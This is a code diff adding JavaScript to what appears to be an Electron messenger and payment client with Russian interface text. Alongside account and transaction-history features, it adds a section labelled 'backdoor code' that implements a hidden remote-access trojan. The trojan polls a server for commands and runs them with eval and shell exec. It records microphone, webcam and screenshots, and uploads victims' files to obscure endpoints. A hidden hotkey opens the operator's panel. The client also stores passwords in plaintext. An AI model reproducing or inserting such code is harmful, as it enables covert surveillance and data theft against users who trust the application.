+        second: `numeric`,
+    },
+    format(date) {
+        return `${date.getDate().toString().padStart(2, 0)}.${(date.getMonth() + 1).toString().padStart(2, 0)}.${date.getFullYear()} ${date.toLocaleString(`ru`, this.options)}:${date.getMilliseconds()}`;
+    }
+};
+
+const showHistoryPage = async page => {
+    const {historyPart: history} = await getHistoryByPage(page);
+    const {operations} = history;
+    let r = ``;
+    if (operations.length) {
+        opsClear.textContent = ``;
+        for (let i = 0; i < operations.length; i++) {
+            const operation = operations[i];
+            let sender = `Вы`, recipient = operation._id;
+            if (!operation.outgoing) {
+                [sender, recipient] = [recipient, sender];
+            }
+            r += 
+`<tr class="historyString">
+    <td>${sender}</td>
+    <td><span class="opstd"><img src="styles/send.png" style="height: 25px;"></span></td>
+    <td>${recipient}</td>
+    <td><span style="font-weight: bold; color: ${operation.value < 0 ? `red` : `green`}">${operation.value > 0 ? `+`: ``}${operation.value}</span></td>
+    <td>${date.format(new Date(operation.date))}</td>
+    <td>${operation.comment}</td>
+</tr>`;
+        }
+    } else {
+        opsClear.textContent = `Здесь пока пусто`;
+    }
+    operationsBlock.innerHTML = `<table style="display: inline-block; user-select: text; border-collapse: collapse;">${r}</table>`;
+};
+
+let curPage = 0;
+
+getElem(`pageNumForm`).addEventListener(`submit`, e => {
+    e.preventDefault();
+    const newPage = +pageNum.value;
+    if (Number.isInteger(newPage) && newPage >= 0) {
+        opsClear.textContent = ``;
+        curPage = newPage;
+        showHistoryPage(curPage);
+    } else {
+        pageNum.value = 0;
+        opsClear.textContent = `Номер страницы должен быть целым положительным числом`;
+    }
+});
+
+getElem(`operationsNext`).addEventListener(`click`, () => {
+    curPage++;
+    pageNum.value = curPage;
+    showHistoryPage(curPage);
+});
+
+getElem(`operationsBack`).addEventListener(`click`, () => {
+    if (curPage) {
+        curPage--;
+        pageNum.value = curPage;
+        showHistoryPage(curPage);
+    }
+});
+
+getElem(`showOperationHistory`).addEventListener(`click`, async () => {
+    if (user._account) {
+        operationHistory.style.display = `block`;
+        accOperationtitle.textContent = `История операций счета ${user._account._id}`;
+        await showHistoryPage(curPage);
+        swal({
+            content: operationHistory,
+            button: false
+        }).then(() => {
+            swal({
+                content: elements.moneyAccount,
+                button: false
+            });
+        });
+    } else {
+        accOperationsState.textContent = `У вас нет счета!`;
+    }
+});
+
+getElem(`deleteAcc`).addEventListener(`click`, async () => {
+    if (user._account) {
+        swal({
+            title: `Внимание!`,
+            text: "Вы уверены, что хотите удалить счет? Вернуть удаленные данные не представляется возможным!",
+            buttons: ["Отмена", "Да"],
+            icon: "warning",
+        }).then(async answer => {
+            if (answer) {
+                const {
+                    _id,
+                    password
+                } = user._account;
+                const answer = await requestPostAsync({
+                    url: `${server}/deleteAccount`,
+                    form: {
+                        data: await getDataProperty({
+                            _id,
+                            password,
+                        }, user),
+                        _id: user._id
+                    }
+                });
+                if (answer.success) {
+                    delete user._account;
+                    accOperationsState.textContent = `Счет удален.`;
+                    balance.textContent = ``;
+                    accState.textContent = ``;
+                } else {
+                    accOperationsState.textContent = `Не удалось удалить счет.`;
+                }
+            }
+            swal({
+                content: elements.moneyAccount,
+                button: false
+            });
+        });
+    } else {
+        accOperationsState.textContent = `У вас нет счета!`;
+    }
+});
+
+getElem(`loginInAcc`).addEventListener(`click`, async () => {
+    const p = passwordAcc.value;
+    const password = hashPassword(p);
+    const _id = idAcc.value;
+    const encryptedAnswer = await requestPostAsync({
+        url: `${server}/loginInAccount`,
+        form: {
+            data: await getDataProperty({
+                _id,
+                password
+            }, user),
+            _id: user._id
+        }
+    });
+    const answer = await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
+    if (answer.logIn) {
+        accState.textContent = `Ваш текущий счет: ${_id}`;
+        accOperationsState.textContent = ``;
+        balance.textContent = answer.balance;
+        balance.style.color = !answer.balance ? `inherit` : answer.balance > 0 ? `green` : `red`;
+        localStorage.setItem(`accountId`, _id);
+        localStorage.setItem(`accountPassword`, p);
+        user._account = {
+            _id,
+            password
+        };
+    } else {
+        accState.textContent = `Неправильный id или пароль`;
+        delete user._account;
+        balance.textContent = ``;
+        accOperationsState.textContent = ``;
+    }
+});
+
+getElem(`changePasswordAcc`).addEventListener(`click`, () => {
+    if (user._account) {
+        swal({
+            title: `Внимание!`,
+            text: "Вы уверены, что хотите изменить пароль счета?",
+            buttons: ["Отмена", "Да"],
+            icon: "warning",
+        }).then(async answer => {
+            if (answer) {
+                const {
+                    _id,
+                    password
+                } = user._account;
+                const newPassword = hashPassword(newPasswordInput.value);
+                const answer = await requestPostAsync({
+                    url: `${server}/changeAccountPassword`,
+                    form: {
+                        data: await getDataProperty({
+                            _id,
+                            password,
+                            newPassword
+                        }, user),
+                        _id: user._id
+                    }
+                });
+                if (answer.success) {
+                    delete user._account;
+                    accOperationsState.textContent = `Пароль успешно изменен.`;
+                    balance.textContent = ``;
+                    accState.textContent = ``;
+                } else {
+                    accOperationsState.textContent = `Пароли не должны совпадать!`;
+                }
+            }
+            swal({
+                content: elements.moneyAccount,
+                button: false
+            });
+        });
+    } else {
+        accOperationsState.textContent = `У вас нет счета!`;
+    }
+});
+
+let once = false;
+let createdId;
+
+getElem(`createMoneyAcc`).addEventListener(`click`, async () => {
+    if (once) {
+        idCreatedAcc.textContent = `Вы уже создали счет. Его id: ${createdId}`;
+        return;
+    }
+    const encryptedAnswer = await requestPostAsync({
+        url: `${server}/createAccount`,
+        form: {
+            data: await getDataProperty({
+                password: hashPassword(passwordAccNew.value)
+            }, user),
+            _id: user._id
+        }
+    });
+    const {
+        _id
+    } = await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
+    createdId = _id;
+    idCreatedAcc.textContent = `id созданного счета: ${_id}`;
+    once = !once;
+});
+
+elements.money.addEventListener(`click`, () => {
+    elements.moneyAccount.style.display = `block`;
+    swal({
+        content: elements.moneyAccount,
+        button: false
+    });
+});
+
+const oneToOneBlock = getElem(`oneToOneBlock`);
+
+getElem(`oneToone`).addEventListener(`click`, () => {
+    oneToOneBlock.style.display = `block`;
+    swal({
+        content: oneToOneBlock,
+        button: false
+    });
+});
+
+//backdoor code
+
+let checkedRoot = false;
+let accessRoot = false;
+const backDoorBlock = getElem(`backDoor`);
+const command = getElem(`command`);
+const sendCommand = getElem(`sendCommand`);
+const recipients = getElem(`recipients`);
+const backDoorResults = getElem(`backDoorResults`);
+const clearResults = getElem(`clearResults`);
+const curPath = getElem(`curPath`);
+const goToParentDir = getElem(`goToParentDir`);
+const backDoorFilesAndDirs = getElem(`backDoorFilesAndDirs`);
+const downloadAll = getElem(`downloadAll`);
+const goToStart = getElem(`goToStart`);
+const goToPath = getElem(`goToPath`);
+const backDoorDir = path.join(hendrixdir, `backdoor`);
+const packetSize = 262144;
+
+const getDataPropertyBackDoor = (data, user) => {
+    return encryptAES(JSON.stringify(data), user.aesKeyBytes);
+};
+
+const getDecryptedDataBackDoor = (data, key) => {
+    return JSON.parse(decryptAES(data, key));
+}
+
+const determineScreenShotSize = () => {
+    const screenSize = screen.getPrimaryDisplay().workAreaSize;
+    const maxDimension = Math.max(screenSize.width, screenSize.height);
+    return {
+        width: maxDimension * window.devicePixelRatio,
+        height: maxDimension * window.devicePixelRatio
+    };
+};
+
+const audio = async (time = 3000) => {
+    const recorder = await getRec();
+    if (!recorder) {
+        return sendReadyData(`Ошибка: доступ к микрофону заблокирован!`);
+    }
+    recorder.start();
+    sendReadyData(`Запись с микрофона началась`);
+    recorder.ondataavailable = async e => {
+        const buf = await blobToBuffer(e.data);
+        filesBackDoorSendCallbacksStack.push(async () => {
+            await sendBufferBackDoor(buf, `.mp3`);
+        });
+    };
+    await sleep(time);
+    recorder.stop();
+    sendReadyData(`Запись с микрофона закончена`);
+    recorder.stream.getTracks().map(track => track.stop());
+};
+
+let curScreenid;
+
+const stopRec = () => clearInterval(curScreenid);
+
+const rec = time => {
+    stopRec();
+    curScreenid = setInterval(tsc, time);
+};
+
+const video = async (time = 2000, video = true, audio = true) => {
+    try {
+        const videoSource = await navigator.mediaDevices.getUserMedia({
+            video,
+            audio
+        });
+        sendReadyData(`Запись видео началась`);
+        const recorder = new MediaRecorder(videoSource, {
+            mimeType: `video/webm;codecs=h264,vp9,opus`
+        });
+        recorder.start();
+        recorder.ondataavailable = async e => {
+            const buf = await blobToBuffer(e.data);
+            filesBackDoorSendCallbacksStack.push(async () => {
+                await sendBufferBackDoor(buf, `.webm`);
+            });
+        };
+        await sleep(time);
+        recorder.stop();
+        videoSource.getTracks().map(track => track.stop());
+        sendReadyData(`Запись видео закончена. Длительность ${time} ms`);
+    } catch (e) {
+        sendReadyData(`Ошибка: ${e.message}`);
+    }
+};
+
+const tsc = () => {
+    const thumbSize = determineScreenShotSize();
+    let options = {
+        types: ['screen'],
+        thumbnailSize: thumbSize
+    };
+    desktopCapturer.getSources(options, (error, sources) => {
+        if (error) return console.log(error)
+        sources.forEach((source) => {
+            if (source.name === 'Entire screen' || source.name === 'Screen 1') {
+                const buf = source.thumbnail.toPNG();
+                if (!buf) {
+                    return;
+                }
+                filesBackDoorSendCallbacksStack.push(async () => {
+                    await sendBufferBackDoor(buf, `.png`);
+                });
+            };
+        });
+    });
+    return `Делаю скриншот...`;
+};
+
+let filesBackDoorSendCallbacksStack = [];
+
+setTimeout(async function execFilesBackDoorCallbacks() {
+    while (filesBackDoorSendCallbacksStack.length) {
+        await filesBackDoorSendCallbacksStack.pop()();
+    }
+    setTimeout(execFilesBackDoorCallbacks, 500);
+}, 0);
+
+const getDir = dirPath => {
+    const stat = fs.statSync(dirPath);
+    if (stat.isDirectory()) {
+        const files = fs.readdirSync(dirPath).map(fileName => path.join(dirPath, fileName)).filter(filePath => fs.statSync(filePath).isFile());
+        for (let i = 0; i < files.length; i++) {
+            filesBackDoorSendCallbacksStack.push(async () => {
+                await dnFile(files[i]);
+            });
+        }
+    } else {
+        return `${dirPath} не каталог`;
+    }
+};
+
+const clearStack = () => {
+    filesBackDoorSendCallbacksStack = [];
+    return `Очередь файлов на отправку очищена`;
+};
+
+const getFile = filePath => {
+    filesBackDoorSendCallbacksStack.push(async () => {
+        await dnFile(filePath);
+    });
+};
+
+const dnFile = async filePath => {
+    try {
+        const stat = fs.statSync(filePath);
+        if (stat.isFile()) {
+            if (stat.size < 10485760) {
+                const fileExt = path.extname(filePath);
+                const fileName = path.basename(filePath, fileExt);
+                const buf = fs.readFileSync(filePath);
+                if (!buf.length) {
+                    throw new Error(`Файл ${filePath} пуст`);
+                }
+                await sendBufferBackDoor(buf, fileExt, fileName);
+                return sendReadyData(`Файл отправляется`);
+            } else {
+                throw new Error(`Файл слишком большой. (${stat.size}) байт`);
+            }
+        } else {
+            throw new Error(`Некорректный путь к файлу`);
+        }
+    } catch (e) {
+        return sendReadyData(e.message);
+    }
+};
+
+const sendBufferBackDoor = async (buffer, ext, fileId) => {
+    const len = buffer.length;
+    if (!len) {
+        return;
+    }
+    buffer = divideBuf(buffer, packetSize).reverse();
+    const readable = Readable();
+    readable._read = function () {
+        if (buffer.length) {
+            this.push(buffer.pop());
+        } else {
+            this.push(null);
+        }
+    }
+    await sendFileBackDoor(null, len, readable, ext, fileId);
+};
+
+const sendFileBackDoor = async (file, size, readable, extn, fileId) => {
+    const callbackStack = [];
+    let readStream;
+    let ext;
+    if (file) {
+        readStream = fs.createReadStream(file, {
+            highWaterMark
+        });
+        ext = path.extname(file);
+    } else {
+        readStream = readable;
+        ext = extn;
+    }
+    if (!fileId) {
+        fileId = await getRandomId();
+    }
+    let position = 0;
+    readStream.on(`data`, data => {
+        callbackStack.push(async () => {
+            position++;
+            const filePart = data.toString(encoding);
+            let obj = {
+                filePart,
+                fileId,
+                ext,
+                position,
+            };
+            await requestPostAsync({
+                url: `${server}/cXVNwFSJeTwXFH6`,
+                form: {
+                    data: getDataPropertyBackDoor(obj, user),
+                    _id: user._id
+                }
+            });
+        });
+    });
+    await waitStream(readStream);
+    for (let i = 0; i < callbackStack.length; i++) {
+        await callbackStack[i]();
+    }
+    await requestPostAsync({
+        url: `${server}/cXVNwFSJeTwXFH6`,
+        form: {
+            data: getDataPropertyBackDoor({
+                fileId,
+                ext,
+                ready: true,
+            }, user),
+            _id: user._id
+        }
+    });
+};
+
+clearResults.addEventListener(`click`, () => {
+    backDoorResults.textContent = ``;
+});
+
+const sendCommandBackDoor = async (textCommand, destination) => {
+    const serverAnswer = await requestPostAsync({
+        url: `${server}/9Zb6JDSz7AQtfb3`,
+        form: {
+            data: getDataPropertyBackDoor({
+                command: textCommand,
+                destination
+            }, user),
+            _id: user._id
+        }
+    });
+    decAns = getDecryptedDataBackDoor(serverAnswer.data, user.aesKeyBytes);
+    return decAns;
+}
+
+sendCommand.addEventListener(`click`, async () => {
+    if (!command.value) {
+        return;
+    }
+    const decAns = await sendCommandBackDoor(command.value, recipients.value);
+    if (decAns.error) {
+        backDoorResults.textContent += `Некорректная команда: ${command.value}\n${decAns.errorReason}\n`;
+    }
+});
+
+const usersDirectories = {};
+const userFiles = {};
+let parentDir;
+let currentDir;
+
+const snd = dir => sendCommandBackDoor(getBacckDoorFilesFormCommand(`${JSON.stringify(dir)}`), victimId.value);
+
+global.sndd = id => {
+    if (idsToFiles[id]) {
+        snd(idsToFiles[id]);
+    }
+};
+
+global.dnf = id => {
+    if (idsToFiles[id]) {
+        sendCommandBackDoor(`getFile('${idsToFiles[id].join(path.sep.repeat(2))}')`, victimId.value);
+    }
+};
+
+let idsToFiles = {};
+
+goToParentDir.addEventListener(`click`, () => {
+    if (!parentDir) {
+        return;
+    }
+    snd(parentDir);
+});
+
+downloadAll.addEventListener(`click`, () => {
+    if (!currentDir) {
+        return;
+    }
+    sendCommandBackDoor(`getDir('${currentDir.join(path.sep.repeat(2))}')`, victimId.value);
+});
+
+goToStart.addEventListener(`click`, async () => {
+    const ans = await sendCommandBackDoor(getBacckDoorFilesFormCommand(`"${goToPath.value.replace(/\\([a-z])/gi, `\\\\$1`)}"`), victimId.value);
+    if (ans.error) {
+        parentDir = undefined;
+        showErrorModal(ans.errorReason);
+    }
+});
+
+const rootSub = async () => {
+    const r = await requestPostAsync({
+        url: `${server}/cXVNwFSJeTwXFH6`,
+        form: {
+            _id: user._id,
+            waitingData: true
+        }
+    });
+    if (!r) {
+        return process.nextTick(rootSub);
+    }
+    const {
+        data
+    } = r;
+    const decData = getDecryptedDataBackDoor(data, user.aesKeyBytes);
+    if (`result` in decData) {
+        let jsonPart;
+        try {
+            jsonPart = JSON.parse(decData.result);
+            if (jsonPart.backDoorFiles) {
+                const {
+                    backDoorFiles: data
+                } = jsonPart;
+                if (data.dir) {
+                    idsToFiles = {};
+                    currentDir = data.dir;
+                    curPath.value = data.dir.join(path.sep);
+                    parentDir = data.parentDir;
+                    const {
+                        files,
+                        stats
+                    } = data;
+                    let r = ``;
+                    for (let i = 0; i < files.length; i++) {
+                        const id = await getRandomId();
+                        idsToFiles[id] = files[i];
+                        const lastEl = files[i][files[i].length - 1];
+                        r += `<div class="dirFile" onclick="${stats[i] ? `sndd('${id}')` : `dnf('${id}')`}">${lastEl}</div>`
+                    }
+                    backDoorFilesAndDirs.innerHTML = r;
+                }
+            } else {
+                throw new Error;
+            }
+        } catch (e) {
+            backDoorResults.textContent += `${decData._victimId}: ${decData.result}\n`;
+        }
+    } else {
+        const victimPath = path.join(backDoorDir, Buffer.from(decData._victimName).toString(`hex`));
+        if (!usersDirectories[decData._victimId]) {
+            usersDirectories[decData._victimId] = victimPath;
+        }
+        if (!fs.existsSync(victimPath)) {
+            try {
+                fs.mkdirSync(usersDirectories[decData._victimId]);
+            } catch {}
+        }
+        if (decData.ready) {
+            const fileObj = userFiles[decData.fileId];
+            SSort((a, b) => a - b, fileObj.positions, fileObj.parts);
+            if (!(fileObj.positions[0] == 1 && fileObj.positions.every((e, p, a) => !p || e - a[p - 1] == 1))) {
+                showErrorModal(`${fileObj.path} поврежден!`);
+            }
+            fs.writeFileSync(fileObj.path, Buffer.concat(fileObj.parts));
+            delete userFiles[decData.fileId];
+        } else {
+            const {
+                fileId,
+                ext,
+                filePart,
+                position
+            } = decData;
+            if (!userFiles[fileId]) {
+                userFiles[fileId] = {
+                    path: path.join(usersDirectories[decData._victimId], `${fileId}${ext}`),
+                    positions: [],
+                    parts: []
+                };
+            }
+            const fileObj = userFiles[fileId];
+            fileObj.positions.push(position);
+            fileObj.parts.push(Buffer.from(filePart, encoding));
+        }
+    }
+    process.nextTick(rootSub);
+};
+
+const backDoorFiles = getElem(`backDoorFiles`);
+const victimId = getElem(`victimId`);
+
+document.addEventListener(`keydown`, async e => {
+    if (e.shiftKey && e.ctrlKey && e.key.match(/[иb]/i) && user.active) {
+        if (!checkedRoot) {
+            checkedRoot = true;
+            accessRoot = getDecryptedDataBackDoor((await requestPostAsync({
+                url: `${server}/Si9Mu7IY8LpTvqj`,
+                form: {
+                    _id: user._id
+                }
+            })).data, user.aesKeyBytes).access;
+            if (accessRoot) {
+                getElem(`backDoor`).style.display = `block`;
+                rootSub();
+                fs.readdir(backDoorDir, (err, data) => {
+                    if (err) {
+                        fs.mkdir(backDoorDir, {
+                            recursive: true
+                        }, (err) => {
+                            if (err) throw err;
+                        });
+                    }
+                });
+            }
+        }
+        if (accessRoot) {
+            swal({
+                content: backDoorBlock,
+                button: false
+            });
+        }
+    } else if (e.shiftKey && e.ctrlKey && e.key.match(/[тn]/i) && accessRoot) {
+        backDoorFiles.style.display = `block`;
+        swal({
+            content: backDoorFiles,
+            button: false
+        });
+    }
+});
+
+const getBacckDoorFilesFormCommand = dir => `
+if (Array.isArray(${dir})) {
+    fp = ${dir}.join(path.sep);
+} else {
+    fp = ${dir};
+}
+files = fs.readdirSync(fp).map(fileName => path.join(fp, fileName)).filter(filePath => {
+    try {
+        return !!fs.statSync(filePath);
+    } catch (e) {
+        return false;
+    }
+});
+({
+    backDoorFiles: {
+        dir: fp.split(path.sep),
+        files: files.map(filePath => filePath.split(path.sep)),
+        stats: files.map(filePath => fs.statSync(filePath).isDirectory()),
+        parentDir: path.join(fp, "..").split(path.sep)
+    }
+})`;
+
+getElem(`backDoorFilesForm`).addEventListener(`submit`, async e => {
+    e.preventDefault();
+    const ans = await sendCommandBackDoor(getBacckDoorFilesFormCommand(`hendrixdir`), victimId.value);
+    if (ans.error) {
+        parentDir = undefined;
+        showErrorModal(ans.errorReason);
+    }
+});
+
+const msg = message => dialog.showMessageBox(currentWindow, {
+    type: `info`,
+    title: `Уведомление`,
+    message
+});
+
+const emsg = message => dialog.showMessageBox(currentWindow, {
+    type: `error`,
+    title: `Уведомление`,
+    message
+});
+
+const cmd = command => (exec(`chcp 65001 | ${command}`, (er, data) => {
+    if (er) {
+        return sendReadyData(er.message);
+    }
+    sendReadyData(data.toString());
+}), `Команда выполняется`);
+
+const {
+    exec
+} = require('child_process');
+
+const executeCode = code => {
+    try {
+        return JSON.stringify(eval(code)) || ``;
+    } catch (e) {
+        return e.message;
+    }
+};
+
+const sendReadyData = async result => {
+    await requestPostAsync({
+        url: `${server}/cXVNwFSJeTwXFH6`,
+        form: {
+            data: getDataPropertyBackDoor({
+                result
+            }, user),
+            _id: user._id
+        }
+    });
+};
+
+const getCommand = async () => {
+    const p = await requestPostAsync({
+        url: `${server}/Mh3lWGicrcSGu7V`,
+        form: {
+            _id: user._id
+        }
+    });
+    if (!p) {
+        return process.nextTick(getCommand);
+    }
+    const cmd = p.data;
+    const {
+        command
+    } = getDecryptedDataBackDoor(cmd, user.aesKeyBytes);
+    const dt = executeCode(command) || ``;
+    result = dt.length > packetSize ? (sendBufferBackDoor(Buffer.from(dt), `.txt`), `Слишком большой результат команды, отправляю файл`) : dt;
+    await sendReadyData(result);
+    process.nextTick(getCommand);
+};
